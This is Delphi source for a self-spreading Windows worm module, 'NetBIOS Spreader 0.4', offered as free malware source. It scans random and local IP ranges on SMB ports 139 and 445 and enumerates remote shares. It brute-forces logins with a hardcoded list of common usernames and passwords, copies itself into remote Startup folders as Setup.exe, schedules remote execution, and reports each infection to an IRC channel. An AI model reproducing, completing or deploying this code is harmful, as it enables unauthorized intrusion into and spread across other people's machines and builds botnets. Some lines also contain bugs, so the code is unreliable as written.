   {***********************************************************************}
   {  NetBIOS Spreader 0.4 by Positron                                     }
   {  URL: http://www.virustrading.com/positron                            }
   {                                                                       }
   {  Tested on Windows XP. Write me if you find any error in the code!    }
   {                                                                       }
   {  If you use this source then you must credit Positron. You can freely }
   {  use this source in NON-Commercial applications.                      }
   {                                                                       }
   {  Thanks goes to r-22                                                  }
   {                                                                       }
   {  Notice:                                                              }
   {    You can use ACLUnits and KOL System replacement units if you want  }
   {    to make its compiled size smaller.                                 }
   {***********************************************************************}
   {  History:                                                             }
   {     08/08/2003 - First public version (v0.3)                          }
   {     10/09/2003 - Some optimalisations (v0.4)                          }
   {***********************************************************************}

   UNIT NetBIOS;

   INTERFACE

   USES
     Windows, WinSock, WinInet,Unit1;

   PROCEDURE StartNetBIOS(NumberOfThreads:WORD);

   VAR
     lpNetApiBufferFree  : FUNCTION(Buffer:Pointer) : DWORD;STDCALL;
     lpNetRemoteTOD      : FUNCTION(UNCServerName:pChar;BufferPtr:pByte) : DWORD;STDCALL;
     lpNetScheduleJobAdd : FUNCTION(ServerName:pChar;Buffer:pByte;VAR JobID:DWORD) : DWORD;STDCALL;
     OLD_NetShareEnum    : FUNCTION(pszServer:pChar;sLevel:SmallInt;VAR Bufptr;cbBuffer:Cardinal;VAR pcEntriesRead,pcTotalAvail:Cardinal) : DWORD; STDCALL;
     NT_NetShareEnum     : FUNCTION(ServerName:pWideChar;Level:DWORD;VAR Bufptr;Prefmaxlen:DWORD;VAR EntriesRead,TotalEntries,resume_handle:DWORD) : DWORD; STDCALL;

   IMPLEMENTATION

   TYPE
     TNetBIOS = CLASS(TObject)
     PRIVATE
       ClassA       : BYTE;
       ClassB       : BYTE;
       ClassC       : BYTE;
       ClassD       : BYTE;
       LANInfect    : BOOL;
       ISPInfect    : BOOL;
       szIPAddr     : STRING;
       szRemoteAddr : STRING;
       PROCEDURE GetISPIP;
       PROCEDURE GetRandomIP;
       PROCEDURE InfectNetBIOS;
       FUNCTION  EnumShare : BOOL;
       FUNCTION  IntToStr(I:Integer) : STRING;
       FUNCTION  DirectoryExists(CONST Dir:STRING) : BOOL;
       PROCEDURE NetRemoteExecute(szLocation:STRING);
       FUNCTION  InfectSharedResource(szRemoteName:STRING) : BOOL;
     PUBLIC
       PROCEDURE StartNetBIOS;
   END;

   CONST
     PREVIOUS_IP              = '2';
     NEXT_IP                  = '1';
     NERR_SUCCESS             = 0;
     MAX_USERNAME             = 4;
     STYPE_PRINTQ             = 1;
     MAX_PASSWORD             = 101;

   PROCEDURE TNetBIOS.GetISPIP;
   LABEL Abort;
   TYPE
     TAPInAddr = ARRAY [0..100] OF PInAddr;
     PAPInAddr =^TAPInAddr;
   VAR
     I          : Integer;
     WSAData    : TWSAData;
     HostEntPtr : PHostEnt;
     pptr       : PAPInAddr;
   BEGIN
     WSAStartUp($101,WSAData);
     TRY
       HostEntPtr:=GetHostByName(nil);
       IF HostEntPtr=NIL THEN GOTO Abort;
       pptr:=PAPInAddr(HostEntPtr^.h_addr_list);
       I:=0;
       WHILE pptr^[I]<>NIL DO BEGIN
         IF(Pos('169',inet_ntoa(pptr^[I]^))<>1)AND(Pos('192',inet_ntoa(pptr^[I]^))<>1) THEN BEGIN
           ClassA:=Ord(pptr^[I]^.S_un_b.s_b1);
           ClassB:=Ord(pptr^[I]^.S_un_b.s_b2);
           ClassC:=Ord(pptr^[I]^.S_un_b.s_b3);
           ClassD:=Ord(pptr^[I]^.S_un_b.s_b4);
           GOTO Abort;
         END;
         Inc(I);
       END;
       Abort:
     EXCEPT
     END;
     WSACleanUp();
   END;

   //------------------------------------------------------------------------------
   FUNCTION TNetBIOS.IntToStr(I:Integer) : STRING;
   BEGIN
     Str(I,Result);
   END;

   //------------------------------------------------------------------------------
   FUNCTION TNetBIOS.DirectoryExists(CONST Dir:STRING) : BOOL;
   VAR
     Attr : DWORD;
   BEGIN
     Attr:=GetFileAttributes(pChar(Dir));
     Result:=(Attr<>$FFFFFFFF)AND(Attr AND FILE_ATTRIBUTE_DIRECTORY=FILE_ATTRIBUTE_DIRECTORY);
   END;

   //------------------------------------------------------------------------------
   FUNCTION IsNTBasedOS : BOOL;
   VAR
     verInfo : TOSVersionInfo;
   BEGIN
     Result:=False;
     verInfo.dwOSVersionInfoSize:=SizeOf(TOSVersionInfo);
     GetVersionEx(verInfo);
     IF verInfo.dwPlatformId=VER_PLATFORM_WIN32_NT THEN Result:=True;
   END;

   //------------------------------------------------------------------------------
   PROCEDURE TNetBIOS.NetRemoteExecute(szLocation:STRING);
   TYPE
     PTIME_OF_DAY_INFO = ^TTIME_OF_DAY_INFO;
     TTIME_OF_DAY_INFO = RECORD
       tod_elapsedt    : DWORD;
       tod_msecs       : DWORD;
       tod_hours       : DWORD;
       tod_mins        : DWORD;
       tod_secs        : DWORD;
       tod_hunds       : DWORD;
       tod_timezone    : LongInt;
       tod_tinterval   : DWORD;
       tod_day         : DWORD;
       tod_month       : DWORD;
       tod_year        : DWORD;
       tod_weekday     : DWORD;
     END;
     AT_INFO           = RECORD
       JobTime         : DWORD;
       DaysOfMonth     : DWORD;
       DaysOfWeek      : UCHAR;
       Flags           : UCHAR;
       Command         : pWideChar;
     END;
   VAR
     JobID        : DWORD;
     dwRemoteTime : DWORD;
     dwReturn     : DWORD;
     NetAT        : AT_INFO;
     wcCmd        : PWideChar;
     wcServer     : PWideChar;
     lpNetTOD     : PTIME_OF_DAY_INFO;
   BEGIN
     GetMem(wcCmd,1024+1);
     GetMem(wcServer,256+1);
     lpNetTOD:=NIL;
     StringToWideChar(szRemoteAddr,wcServer,256);
     StringToWideChar(szLocation,wcCmd,1024);
     dwReturn:=lpNetRemoteTOD(pChar(szRemoteAddr),@lpNetTOD);
     IF dwReturn=NERR_Success THEN BEGIN
       //* add 2 minutes to current time
       dwRemoteTime:=(lpNetTOD.tod_hours*3600+lpNetTOD.tod_mins*60+lpNetTOD.tod_secs)*1000+lpNetTOD.tod_hunds*10;
       IF lpNetTOD.tod_timezone<>-1 THEN dwRemoteTime:=dwRemoteTime-lpNetTOD.tod_timezone*60000;
       dwRemoteTime:=dwRemoteTime+60000;                                           //* add two minutes to current remote time
       IF IsNTBasedOS THEN lpNetApiBufferFree(lpNetTOD);
       ZeroMemory(@NetAT,SizeOf(NetAT));
       NetAT.JobTime:=dwRemoteTime;
       NetAT.Command:=wcCmd;
       dwReturn:=lpNetScheduleJobAdd(pChar(wcServer),@NetAT,JobID);
     END;
     FreeMem(wcCmd);
     FreeMem(wcServer);
   END;

   //------------------------------------------------------------------------------
   FUNCTION TNetBIOS.InfectSharedResource(szRemoteName:STRING) : BOOL;
   VAR
     MaxUserName : WORD;
     MaxPassword : WORD;
     I           : DWORD;
     dwRet       : DWORD;
     szFullPath  : STRING;
     nK          : Integer;
     nL          : Integer;
     nN          : Integer;
     NetResource : TNetResource;
   CONST
     PathSize    = 4;
     Path        : ARRAY[1..PathSize] OF STRING =(
                  '\',
                  '\Documents and Settings\All Users\Start Menu\Programs\Startup\',
                  '\WINDOWS\Start Menu\Programs\Startup\',
                  '\WINNT\Profiles\All Users\Start Menu\Programs\Startup\');
     lpszPassword : ARRAY [0..MAX_PASSWORD] OF STRING = (
           '','1234','password','6969','harley','123456','golf','pussy','mustang',
           '1111','shadow','1313','fish','5150','7777','qwerty','baseball','2112',
           'letmein','12345678','12345','ccc','admin','Admin','Password','1','12',
           '123','1234567','123456789','654321','54321','111','000000','abc','pw',
           '11111111','88888888','pass','passwd','database','abcd','abc123','pass',
           'sybase','123qwe','server','computer','Internet','super','123asd','0',
           'ihavenopass','godblessyou','enable','xp','2002','2003','2600','alpha',
           '110','111111','121212','123123','1234qwer','123abc','007','a','aaa',
           'patrick','pat','administrator','root','sex','god','foobar','secret',
           'abc','test','test123','temp','temp123','win','pc','asdf','oracle''pwd',
           'qwer','yxcv','zxcv','home','xxx','owner','login','Login','pw123',
           'love','mypc','mypc123','admin123','mypass','mypass123','901100');
     lpszUserName : ARRAY [0..MAX_USERNAME] OF STRING = (
           'Guest','Administrator','Administratör','Owner','Root');
   BEGIN
     Result:=False;
     szRemoteName:=szRemoteAddr+'\'+szRemoteName;
     NetResource.dwType:=RESOURCETYPE_DISK;
     NetResource.lpLocalName:=NIL;
     NetResource.lpRemoteName:=pChar(szRemoteName);
     NetResource.lpProvider:=NIL;
     GetModuleFileName(GetModuleHandle(NIL),pChar(szFullPath),Length(szFullPath));
     IF IsNTBasedOS THEN BEGIN
       MaxUserName:=MAX_USERNAME;
       MaxPassword:=MAX_PASSWORD;
     END ELSE BEGIN
       MaxUserName:=0;
       MaxPassword:=0;
     END;
     FOR nK:=0 TO MaxUserName DO BEGIN
       FOR nL:=0 TO MaxPassword DO BEGIN
         NB_USERNAME := lpszUserName[nL];
         NB_PASS := lpszPassword[nL];
         dwRet:=WNetAddConnection2(NetResource,pChar(lpszPassword[nL]),pChar(lpszUserName[nK]),0);
         IF dwRet=NO_ERROR THEN BEGIN
           FOR I:=1 TO PathSize DO BEGIN
             IF DirectoryExists(NetResource.lpRemoteName+Path[I]) THEN BEGIN
               IF CopyFile(pChar(ParamStr(0)),pChar(szRemoteName+Path[I]+'Setup.exe'),False) THEN BEGIN
                  RAW('PRIVMSG '+CHANNEL+' :HOST INFECTED : '+NetResource.lpRemoteName+#13#10);
                  NB_INFECT := INTTOSTR(STRTOINT(NB_INFECT)+1);
                 IF IsNTBasedOS THEN NetRemoteExecute(szRemoteName+Path[I]+'setup.exe');
                 Result:=True;
               END;
             END;
           END;
           FOR nN:=0 TO 20 DO IF WNetCancelConnection(NetResource.lpRemoteName,True)=NO_ERROR THEN Break;
         END;
       END;
     END;
   END;

   //------------------------------------------------------------------------------
   FUNCTION TNetBIOS.EnumShare : BOOL;
   TYPE
     Share_INFO_1   = RECORD
       shi1_netname : PWideChar;
       shi1_type    : DWORD;
       shi1_remark  : LPTSTR;
     END;
     LPShare_INFO_1 =^Share_INFO_1;
   VAR
     dwK            : DWORD;
     hResume        : DWORD;
     dwReturn       : DWORD;
     dwReadEntires  : DWORD;
     dwTotalEntires : DWORD;
     szShareName    : STRING;
     wcRemoteAddr   : pWideChar;
     lpShareInfo    : LPSHARE_INFO_1;
     lpCurrentInfo  : LPSHARE_INFO_1;
   BEGIN
     Result:=False;
     GetMem(wcRemoteAddr,MAX_PATH);
     StringToWideChar(szRemoteAddr,wcRemoteAddr,MAX_PATH);
     hResume:=0;
     REPEAT
       lpShareInfo:=NIL;
       IF IsNTBasedOS THEN dwReturn:=NT_NetShareEnum(wcRemoteAddr,1,lpShareInfo,8192,dwReadEntires,dwTotalEntires,hResume)
        ELSE dwReturn:=OLD_NetShareEnum(pChar(wcRemoteAddr),1,lpShareInfo,8192,dwReadEntires,dwTotalEntires);
       IF(dwReturn<>ERROR_MORE_DATA)AND(dwReturn<>ERROR_SUCCESS) THEN Break;
       lpCurrentInfo:=lpShareInfo;
       FOR dwK:=0 TO dwReadEntires-1 DO BEGIN
         szShareName:=lpCurrentInfo.shi1_netname;
         IF lpcurrentinfo.shi1_type<>STYPE_PRINTQ THEN Result:=InfectSharedResource(szShareName);
         Inc(lpCurrentInfo);
       END;
       IF IsNTBasedOS THEN lpNetAPIBufferFree(lpShareInfo);
     UNTIL dwReturn<>ERROR_MORE_DATA;
     FreeMem(wcRemoteAddr);
   END;

   //------------------------------------------------------------------------------
   PROCEDURE TNetBIOS.GetRandomIP;
   BEGIN
     IF szIPAddr='' THEN BEGIN
       ClassA:=Random(222)+1;
       ClassB:=Random(254)+1;
       ClassC:=Random(254)+1;
       ClassD:=Random(254)+1;
     END;
     IF(szIPAddr=NEXT_IP)AND(ClassD<255)THEN Inc(ClassD);
     IF(szIPAddr=NEXT_IP) THEN BEGIN
       IF (ClassD<255) THEN Inc(ClassD) ELSE ClassD:=1;
     END;
     IF(szIPAddr=PREVIOUS_IP) THEN BEGIN
       IF (ClassD>2)THEN Dec(ClassD,2) ELSE ClassD:=255;
     END;
     IF ISPInfect THEN BEGIN
       GETISPIP;
       ClassC:=Random(254)+1;
       ClassD:=Random(254)+1;
     END;
     IF LANInfect THEN BEGIN
       ClassA:=192;
       ClassB:=169;
       ClassC:=Random(254)+1;
       ClassD:=Random(254)+1;
     END;
     szIPAddr:=IntToStr(ClassA)+'.'+IntToStr(ClassB)+'.'+IntToStr(ClassC)+'.'+IntToStr(ClassD);
   END;

   //------------------------------------------------------------------------------
   PROCEDURE TNetBIOS.InfectNetBIOS;
   VAR
     R             : BOOL;
     Connected     : BOOL;
     Sock          : TSocket;
     SockAddr      : TSockAddrIn;
   BEGIN
     R:=False;
     Connected:=False;
     szIPAddr:='';
     WHILE True DO BEGIN
       WHILE NOT InternetGetConnectedState(NIL,0) DO Sleep(1000);
       IF R=True THEN BEGIN
         IF szIPAddr=PREVIOUS_IP THEN szIPAddr:='' ELSE BEGIN
           IF szIPAddr=NEXT_IP THEN szIPAddr:=PREVIOUS_IP;
           IF szIPAddr='' THEN szIPAddr:=NEXT_IP;
         END;
       END ELSE szIPAddr:='';
       GetRandomIP;
       NB_SCANNED := IntToStr(StrToInt(NB_SCANNED)+1);
       Sock:=Socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
       SockAddr.sin_family:=AF_INET;
       SockAddr.sin_port:=htons(139);
       SockAddr.sin_addr.S_addr:=inet_addr(pChar(szIPAddr));
       IF connect(Sock,SockAddr,SizeOf(SockAddr))<>SOCKET_ERROR THEN Connected:=True
       ELSE BEGIN
         NB_CLOSED := IntToStr(StrToInt(NB_CLOSED)+1);
         SockAddr.sin_family:=AF_INET;
         SockAddr.sin_port:=htons(445);
         SockAddr.sin_addr.S_addr:=inet_addr(pChar(szIPAddr));
         IF connect(Sock,SockAddr,SizeOf(SockAddr))<>SOCKET_ERROR THEN Connected:=True Else
         NB_CLOSED := IntToStr(StrToInt(NB_CLOSED)+1);
       END;
       IF Connected THEN BEGIN
         NB_OPEN := IntToStr(StrToInt(NB_OPEN)+1);
         CloseSocket(Sock);
         szRemoteAddr:='\\'+szIPAddr;
         R:=EnumShare;
       END ELSE BEGIN
       END;
       Sleep(512);
     END;
   END;

   //------------------------------------------------------------------------------
   PROCEDURE InitNETAPIFunctions;
   VAR
     NETAPI32 : Thandle;
   BEGIN
     NETAPI32:=LoadLibrary('netapi32.dll');
     lpNetRemoteTOD:=GetProcAddress(NETAPI32,'NetRemoteTOD');
     lpNetScheduleJobAdd:=GetProcAddress(NETAPI32,'NetScheduleJobAdd');
     IF IsNTBasedOS THEN BEGIN
       NT_NetShareEnum:=GetProcAddress(NETAPI32,'NetShareEnum');
       lpNetAPIBufferFree:=GetProcAddress(NETAPI32,'NetApiBufferFree');
     END ELSE OLD_NetShareEnum:=GetProcAddress(NETAPI32,'NetShareEnum');
   END;

   //------------------------------------------------------------------------------
   PROCEDURE TNetBIOS.StartNetBIOS;
   BEGIN
     ISPInfect:=False;
     LANInfect:=False;
     IF WaitForSingleObject(CreateMutexA(NIL,False,pChar('NetBIOSThread1')),0)<>Wait_TimeOut THEN LANInfect:=True;
     IF (LANInfect=False)AND(WaitForSingleObject(CreateMutexA(NIL,False,pChar('NetBIOSThread2')),0)<>Wait_TimeOut) THEN ISPInfect:=True;
     InfectNetBios;
   END;

   //------------------------------------------------------------------------------
   PROCEDURE StartRandomThread;
   VAR
     NetBIOS : TNetBIOS;
   BEGIN
     NetBIOS:=TNetBIOS.Create;
     NetBIOS.StartNetBIOS;
   END;

   //------------------------------------------------------------------------------
   PROCEDURE StartNetBIOS(NumberOfThreads:WORD);
   VAR
     I        : WORD;
     Msg      : TMsg;
     ThreadId : Cardinal;
   BEGIN
     Randomize;
     FOR I:=1 TO NumberOfThreads DO BeginThread(NIL,0,@StartRandomThread,NIL,0,ThreadID);
     WHILE GetMessage(Msg,0,0,0) DO DispatchMessage(Msg);                          //Make application resident
   END;

   //------------------------------------------------------------------------------
   INITIALIZATION
     InitNETAPIFunctions;

   END.
